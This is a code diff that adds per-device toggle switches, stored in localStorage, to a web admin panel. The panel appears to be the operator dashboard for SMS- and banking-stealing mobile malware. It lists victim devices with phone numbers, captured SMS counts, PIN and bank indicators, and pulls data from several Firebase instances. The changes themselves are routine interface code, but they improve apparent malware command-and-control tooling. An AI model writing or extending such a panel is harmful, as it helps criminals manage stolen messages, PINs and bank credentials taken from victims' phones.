@@ -178,6 +178,10 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 .dev-phone{font-size:15px;font-weight:800;margin-bottom:2px}
 .dev-meta{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .dev-chips{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px}
+.dev-toggle-wrap{flex-shrink:0;display:flex;align-items:center;padding-left:4px}
+.toggle.dev-toggle{width:38px;height:22px}
+.toggle.dev-toggle::after{width:16px;height:16px;top:3px;left:3px}
+.toggle.dev-toggle.on::after{transform:translateX(16px)}
 .chip{font-size:8px;padding:3px 8px;border-radius:20px;border:1px solid var(--border);color:var(--muted);font-family:'Space Mono',monospace}
 .chip.bat{color:var(--success);border-color:rgba(0,255,157,0.25)}
 .empty-state{text-align:center;padding:48px 20px;color:var(--muted)}
@@ -385,6 +389,8 @@ var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
 var deviceSmsCache={}, _smsLoadSeq=0;
 var devFilterMode='all', deviceBankCache={};
+var DEVICE_TOGGLE_KEY='rbl_device_toggles';
+var deviceToggleState={};
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
@@ -481,6 +487,22 @@ function setDevFilter(mode,btn){
     }
   }
   renderDevices();updateStats();
+}
+function loadDeviceToggles(){
+  try{
+    var s=localStorage.getItem(DEVICE_TOGGLE_KEY);
+    if(s)deviceToggleState=JSON.parse(s)||{};
+  }catch(e){deviceToggleState={};}
+}
+function saveDeviceToggles(){
+  try{localStorage.setItem(DEVICE_TOGGLE_KEY,JSON.stringify(deviceToggleState));}catch(e){}
+}
+function isDeviceChecked(id){return !!deviceToggleState[id];}
+function toggleDeviceCheck(id,ev){
+  if(ev){ev.stopPropagation();ev.preventDefault();}
+  deviceToggleState[id]=!deviceToggleState[id];
+  saveDeviceToggles();
+  renderDevices();
 }
 function adminApiPost(body){
   return fetch(FIREBASE_API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{}),credentials:'same-origin'})
@@ -739,7 +761,9 @@ function renderDevices(){
       '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
       '<div class="dev-meta">'+esc(d.name)+' · <span class="chip fb">'+esc(d.fbName)+'</span></div>'+
       '<div class="dev-chips">'+pinChip+bankChip+'<span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
-      '</div></div>';
+      '</div>'+
+      '<div class="dev-toggle-wrap" onclick="toggleDeviceCheck(\''+d.id+'\',event)">'+
+      '<div class="toggle dev-toggle'+(isDeviceChecked(d.id)?' on':'')+'" title="'+(isDeviceChecked(d.id)?'Checked':'Unchecked')+'"></div></div></div>';
   }).join('');
 }
 function selectDevice(id){
@@ -1218,6 +1242,7 @@ function useSelForAutoToken(){
 (function(){
   try{
     panelReady=true;
+    loadDeviceToggles();
     fetchAllData().catch(function(){toast('Sync failed — check Firebase URL/secret',false);});
     loadAutoTokenState();
   }catch(e){console.error(e);}
